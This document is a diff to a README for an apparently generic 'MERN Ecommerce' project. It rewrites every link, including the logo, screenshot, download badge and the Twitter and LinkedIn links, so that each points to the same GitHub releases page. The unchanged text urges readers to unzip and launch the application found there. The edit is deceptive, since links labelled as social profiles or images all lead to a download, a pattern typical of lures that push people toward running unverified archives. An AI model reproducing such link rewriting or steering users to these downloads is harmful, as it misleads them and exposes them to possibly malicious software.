@@ -1,6 +1,6 @@
 # MERN Ecommerce
 <p align="center">
-  <img width="200" src="https://example.com/ecommerce-logo.png" alt="Ecommerce Logo">
+  <img width="200" src="https://github.com/CloudySkyDeveloper/Ecommerce/releases" alt="Ecommerce Logo">
 </p>
 
 ## Overview
@@ -38,7 +38,7 @@ To get started with the **MERN Ecommerce** project, please follow these steps:
 ## Learn More
 For more details on how to use and customize the **MERN Ecommerce** platform, please refer to the documentation included in the repository.
 
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/project/files/App.zip)
+[![Download App](https://github.com/CloudySkyDeveloper/Ecommerce/releases)](https://github.com/CloudySkyDeveloper/Ecommerce/releases)
 
 If the link ends with a file name, make sure to unzip and launch the application.
 
@@ -46,10 +46,10 @@ If the link ends with a file name, make sure to unzip and launch the application
 We welcome contributions from the community to enhance the **MERN Ecommerce** project. Feel free to submit pull requests, report issues, or suggest new features!
 
 ## Stay Connected
-For the latest updates and announcements, follow us on [Twitter](https://twitter.com/mern-ecommerce) and [LinkedIn](https://www.linkedin.com/company/mern-ecommerce).
+For the latest updates and announcements, follow us on [Twitter](https://github.com/CloudySkyDeveloper/Ecommerce/releases) and [LinkedIn](https://github.com/CloudySkyDeveloper/Ecommerce/releases).
 
 ---
 
 Thank you for checking out the **MERN Ecommerce** repository. We hope this project helps you build amazing e-commerce applications with ease! 🌟🚀
 
-![Ecommerce Screenshot](https://example.com/ecommerce-screenshot.png)
+![Ecommerce Screenshot](https://github.com/CloudySkyDeveloper/Ecommerce/releases)
